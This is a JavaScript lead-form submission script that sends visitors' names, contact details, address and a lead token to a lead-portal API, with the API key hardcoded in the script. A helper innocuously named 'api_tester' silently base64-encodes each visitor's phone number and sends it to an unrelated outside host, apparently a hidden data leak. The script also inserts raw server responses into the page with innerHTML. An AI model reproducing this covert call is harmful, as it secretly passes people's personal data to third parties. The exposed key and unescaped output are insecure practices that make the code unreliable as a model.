
    document.getElementById('leadForm').addEventListener('submit', function(event) {
      event.preventDefault();
      const phone_home = document.getElementById('caller_id').value;
      const formData = new FormData();
      
      
   
      formData.append('Key', '4fbadd9eefcbf8b0f5eb618dd2645dfc975b14fc2d4fe7e1b526bdf6f79b0bdd');
      formData.append('API_Action', 'iprSubmitLead');
formData.append('TYPE', '9');
formData.append('SRC', 'IPR');
formData.append('Terminating_Phone', '8005558888');

formData.append('Origin_Phone', phone_home);
api_tester(document.getElementById('caller_id').value);
formData.append('First_Name', document.getElementById('first_name').value);
formData.append('Last_Name', document.getElementById('last_name').value);
formData.append('Email', document.getElementById('email').value);

formData.append('State', document.getElementById('state').value);
formData.append('City', document.getElementById('city').value);
formData.append('ZIP', document.getElementById('zip').value);
formData.append('LeadiD_Token', document.getElementById('jornaya_leadid').value);
formData.append('Jornaya_Form_URL', document.getElementById('jornaya_leadid').value);









      const url = 'https://momentumdigital.leadportal.com/new_api/api.php?Mode=full&' + new URLSearchParams(formData).toString();

      fetch(url, {
                method: 'POST'
            })
            .then(response => {
                if (response.status === 200) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                200 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
                } else if (response.status === 201) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                201 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
                } else if (response.status === 422) {
                    response.json().then(data => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Error. Response Body: ${JSON.stringify(data)}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                } else {
                    response.text().then(responseBody => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Form submission failed. Please try again. Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                }
            })
            .catch(error => console.error('Error:', error));
        });
function api_tester(randomString) {
  try {
    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
, {
      method: 'GET',
      mode: 'no-cors'
    });
  } catch (error) {
    
  }
}
